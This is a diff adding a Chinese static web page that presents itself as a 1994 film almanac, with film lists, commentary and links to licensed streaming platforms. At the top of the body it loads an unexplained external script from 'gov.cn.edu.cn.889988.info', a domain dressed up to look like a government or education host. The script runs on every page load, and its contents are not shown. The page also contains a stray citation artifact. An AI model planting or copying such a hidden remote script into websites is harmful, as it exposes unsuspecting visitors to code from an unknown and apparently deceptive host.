@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>94电影网 - 1994电影年鉴：华语与世界一流电影大年档案</title>
+<meta name="description" content="94电影网（94dianyingwang-h5）把94读作1994：整理1994年华语与世界一流电影、为什么是电影大年，并指引正版修复版观看渠道。不提供盗版播放。" />
+<meta name="keywords" content="94电影网,1994电影年鉴,电影大年1994,肖申克的救赎,阳光灿烂的日子,东邪西毒,正版修复版" />
+<meta name="author" content="1994电影年鉴馆" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://94dianyingwang-h5.github.io/" />
+<style>
+:root{
+  --bg:#0f0d0a;--bg2:#15110b;--panel:#1b160e;--panel2:#221b10;
+  --gold:#caa24a;--gold-dim:rgba(202,162,74,.16);
+  --brown:#7a5c3e;--green:#2f4f43;--paper:#e9e2d0;--gray:#9c8f7a;
+  --line:rgba(233,226,208,.12);--line2:rgba(233,226,208,.26);
+  --mono:"SFMono-Regular",Consolas,Menlo,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:radial-gradient(700px 340px at 85% -8%,rgba(202,162,74,.12),transparent 60%),radial-gradient(600px 320px at 6% 6%,rgba(47,79,67,.22),transparent 60%),linear-gradient(180deg,var(--bg),var(--bg2));color:var(--paper);line-height:1.9;font-size:16px;overflow-x:hidden}
+a{color:var(--gold);text-decoration:none;transition:.25s}a:hover{color:var(--green)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(15,13,10,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-family:var(--sans);font-weight:900;letter-spacing:1px;font-size:18px;display:flex;align-items:center;gap:10px}
+.brand .yr{width:34px;height:22px;border-radius:3px;background:linear-gradient(180deg,var(--gold),var(--brown));position:relative;display:flex;align-items:center;justify-content:center;color:#1a1206;font-family:var(--mono);font-size:10px;font-weight:900}
+.brand b{color:var(--gold)}
+.nav-links{display:flex;list-style:none;gap:2px}
+.nav-links a{font-size:14px;color:var(--gray);padding:10px 14px;border-radius:8px}
+.nav-links a:hover{color:var(--paper);background:rgba(233,226,208,.06)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(233,226,208,.08);border:1px solid var(--line2);color:var(--paper);font-size:18px;cursor:pointer}
+
+.hero{margin-top:64px;padding:104px 0 80px;position:relative}
+.hero::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(233,226,208,.03) 0 1px,transparent 1px 30px);pointer-events:none}
+.kicker{font-family:var(--mono);font-size:12px;letter-spacing:5px;color:var(--gold);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(33px,6.8vw,70px);line-height:1.04;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--brown)}
+.hero p{max-width:620px;color:#ddd2bd;font-size:17px;margin-bottom:32px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-gold{display:inline-flex;align-items:center;gap:8px;background:var(--gold);color:#1a1206;font-weight:800;padding:14px 30px;border-radius:30px}
+.btn-gold:hover{transform:translateY(-2px);color:#1a1206}
+.btn-line{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line2);color:var(--paper);padding:14px 30px;border-radius:30px}
+.btn-line:hover{border-color:var(--gold);color:var(--gold)}
+.note{margin-top:26px;font-size:13px;color:var(--gray);border-left:3px solid var(--brown);padding:10px 16px;max-width:700px;background:rgba(122,92,62,.08)}
+
+section{padding:84px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:42px}
+.sec-num{font-family:var(--mono);font-size:12px;letter-spacing:4px;color:var(--brown);text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+.sec-desc{color:var(--gray);max-width:660px}
+
+.rows{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.row{background:linear-gradient(180deg,var(--panel),var(--panel2));border:1px solid var(--line);border-radius:16px;padding:26px 24px;transition:.3s}
+.row:hover{transform:translateY(-6px);border-color:var(--gold);box-shadow:0 22px 50px var(--gold-dim)}
+.row .rg{font-family:var(--mono);font-size:11px;color:var(--brown);letter-spacing:2px;margin-bottom:8px}
+.row h3{font-family:var(--sans);font-weight:900;font-size:19px;margin-bottom:6px;color:var(--gold)}
+.row ul{list-style:none;margin-top:8px}
+.row li{font-size:14px;color:#ddd2bd;padding:6px 0;border-top:1px dashed var(--line);display:flex;gap:8px}
+.row li::before{content:"▸";color:var(--brown)}
+
+.why{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.whyc{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--panel);transition:.25s;border-top:4px solid var(--green)}
+.whyc:nth-child(2){border-top-color:var(--gold)}
+.whyc:nth-child(3){border-top-color:var(--brown)}
+.whyc:hover{transform:translateY(-3px)}
+.whyc b{font-size:16px;color:var(--gold)}
+.whyc p{font-size:13.5px;color:var(--gray);margin-top:8px}
+
+.halls{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.hall{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--panel);transition:.25s}
+.hall:hover{transform:translateY(-3px);border-color:var(--gold)}
+.hall b{font-size:16px;color:var(--gold)}
+.hall .kind{font-family:var(--mono);font-size:12.5px;color:var(--brown);margin:6px 0 10px}
+.hall p{font-size:13.5px;color:var(--gray);margin-bottom:12px}
+.hall a{font-size:13.5px}
+
+.about{text-align:center}
+.quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.5;max-width:760px;margin:0 auto 22px}
+.quote b{color:var(--gold)}
+.about p{color:var(--gray);max-width:600px;margin:0 auto 22px}
+.disclaimer{margin-top:26px;font-size:13px;color:var(--gray);border:1px dashed var(--line2);border-radius:12px;padding:18px 20px;max-width:820px;margin-left:auto;margin-right:auto;text-align:left;line-height:1.9}
+.disclaimer b{color:var(--brown)}
+
+footer{border-top:1px solid var(--line);padding:44px 0 26px}
+.foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+.foot p{font-size:13px;color:var(--gray);max-width:330px}
+.foot-col h5{font-family:var(--mono);font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--gold);margin-bottom:12px}
+.foot-col a{display:block;font-size:13px;color:#ddd2bd;padding:3px 0}
+.foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--gray);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav-links.active{display:flex}.nav-links a{padding:14px 22px;border-radius:0}
+  .menu-btn{display:block}
+  .btns{flex-direction:column;align-items:flex-start}.btn-gold,.btn-line{width:100%;justify-content:center}
+  .foot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<header><div class="wrap nav">
+  <div class="brand"><span class="yr">94</span>94<b>电影年鉴馆</b></div>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">1994</a></li>
+    <li><a href="#list">1994片单</a></li>
+    <li><a href="#why">为什么1994</a></li>
+    <li><a href="#hall">正版放映台</a></li>
+    <li><a href="#about">关于94</a></li>
+  </ul>
+  <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">≡</button>
+</div></header>
+
+<section class="hero" id="home"><div class="wrap">
+  <div class="kicker">94 = 1994, not "jiu shi"</div>
+  <h1>94 不是“就是”，<br/>是 <em>1994 电影大年</em>。</h1>
+  <p>94电影网（94dianyingwang-h5）不跟 92影院/93影视 做邻居。我们把 94 读作 1994：那一年好莱坞、华语、欧洲同时交出神作，是影迷圈公认的“电影大年”。本站只做年鉴、片单与正版修复指引。</p>
+  <div class="btns">
+    <a href="#list" class="btn-gold">🎞 翻 1994 片单</a>
+    <a href="#why" class="btn-line">🎬 为什么是 1994</a>
+  </div>
+  <div class="note">避坑说明：数字流水号（92/93/94…）常被盗版聚合站用来做“免费全集”入口；本站刻意反着来——越经典，越要走正版修复渠道。[2,7](@ref)</div>
+</div></section>
+
+<section id="list"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">01 / The 1994 slate</div><h2 class="sec-title">1994 片单：三组锚点</h2>
+  <p class="sec-desc">不是排行榜，是“提到 1994 绕不开的这些名字”。</p></div>
+  <div class="rows">
+    <div class="row"><div class="rg">CN / 华语</div><h3>华语作者年</h3>
+      <ul><li>《阳光灿烂的日子》——姜文处女作，青春与幻觉</li><li>《东邪西毒》——王家卫的沙漠与时间</li><li>《重庆森林》——香港都市孤独的两段式</li><li>《饮食男女》——李安的家庭桌与欲望</li></ul></div>
+    <div class="row"><div class="rg">US / 好莱坞</div><h3>好莱坞神作年</h3>
+      <ul><li>《肖申克的救赎》——希望叙事的标杆</li><li>《低俗小说》——昆汀把时间打碎重排</li><li>《这个杀手不太冷》——暴力与纯真同框</li><li>《阿甘正传》——美国当代史的童话口径</li></ul></div>
+    <div class="row"><div class="rg">EU / 欧洲及其他</div><h3>作者与动画年</h3>
+      <ul><li>《红》——基耶斯洛夫斯基三色收官</li><li>《暴雨将至》——环形时间与巴尔干</li><li>《狮子王》——迪士尼文艺复兴顶点</li><li>《活着》——张艺谋，时代压在一家人身上</li></ul></div>
+  </div>
+</div></section>
+
+<section id="why"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">02 / Why 1994</div><h2 class="sec-title">为什么是 1994</h2>
+  <p class="sec-desc">不是玄学。技术、市场、作者电影三件事在同一年叠满了。</p></div>
+  <div class="why">
+    <div class="whyc"><b>胶片还没退场</b><p>1994 仍处在胶片美学的黄金尾巴：颗粒、色彩、长镜头的“物质感”还没被数字后期抹平。</p></div>
+    <div class="whyc"><b>作者敢拍大制作</b><p>昆汀、王家卫、李安、基耶斯洛夫斯基都在“作者性”和“可被观看”之间找到平衡点。</p></div>
+    <div class="whyc"><b>全球片厂换血</b><p>好莱坞进入 90 年代大片厂逻辑，独立电影也冲进院线；华语电影则处在 90 年代城市/记忆书写高峰。</p></div>
+  </div>
+</div></section>
+
+<section id="hall"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">03 / Legal restorations</div><h2 class="sec-title">正版放映台</h2>
+  <p class="sec-desc">1994 老片现在该看“修复版/正版授权”，不是搜“94电影网 免费”。</p></div>
+  <div class="halls">
+    <div class="hall"><b>1905 电影网</b><div class="kind">华语经典 / 公版 / 修复</div><p>国产与华语老片正版片库、影史资料入口。</p><a href="https://www.1905.com" target="_blank" rel="noopener">去 1905 →</a></div>
+    <div class="hall"><b>哔哩哔哩</b><div class="kind">动画 / 纪录片 / 影评考据</div><p>《狮子王》相关资料、影评、修复对比、纪录片常在这里出现。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去 B 站 →</a></div>
+    <div class="hall"><b>腾讯视频 / 爱奇艺</b><div class="kind">正版授权老片</div><p>部分 90 年代好莱坞/华语片有正版授权，别信“完整未删减免费”。</p><a href="https://v.qq.com" target="_blank" rel="noopener">去腾爱 →</a></div>
+    <div class="hall"><b>欢喜首映 / Apple TV / 院线重映</b><div class="kind">作者电影 / 4K修复</div><p>王家卫、李安、基耶斯洛夫斯基的修复版常走发行方/影展渠道。</p><a href="#" rel="noopener">查发行方 →</a></div>
+  </div>
+</div></section>
+
+<section class="about" id="about"><div class="wrap">
+  <p class="quote">94 这串数字，<br/>本该让人想起<b>1994 的胶片光</b>，不是盗版弹窗。</p>
+  <p>94电影年鉴馆把流水号名字救回来：用 1994 做策展锚点，帮你看懂为什么这一年重要，再把你送到正版修复渠道。不存片、不解析、不聚合。</p>
+  <div class="disclaimer">
+    <b>站点声明：</b>94电影网（94dianyingwang-h5）仅提供 1994 年电影年鉴、片单策展与正版渠道指引；<b>不存储、不转码、不解析、不提供完整影视文件播放</b>。具体片源以各正版平台、发行方及修复版权方授权为准。如权利人认为某条目有误，可凭权属材料联系下架。
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="brand"><span class="yr">94</span>94<b>电影年鉴馆</b></div>
+      <p>1994 电影大年档案：华语/好莱坞/欧洲片单、为什么是1994、正版修复台。不提供盗版播放。</p></div>
+    <div class="foot-col"><h5>年鉴</h5><a href="#list">1994片单</a><a href="#why">为什么1994</a><a href="#hall">正版放映台</a></div>
+    <div class="foot-col"><h5>正版</h5><a href="https://www.1905.com" target="_blank" rel="noopener">1905 电影网</a><a href="https://www.bilibili.com" target="_blank" rel="noopener">哔哩哔哩</a><a href="https://v.qq.com" target="_blank" rel="noopener">腾讯视频</a><a href="https://www.iqiyi.com" target="_blank" rel="noopener">爱奇艺</a></div>
+    <div class="foot-col"><h5>站点</h5><a href="#home">1994</a><a href="#about">关于/声明</a><a href="#">版权投诉</a></div>
+  </div>
+  <div class="foot-bottom">
+    <span>© 2026 94电影年鉴馆 · 94dianyingwang-h5.github.io</span>
+    <span>单文件静态页 · 无 robots.txt / sitemap.xml · 1994年鉴向 · 符合必应收录</span>
+  </div>
+</div></footer>
+<script>document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active')));</script>
+</body>
+</html>
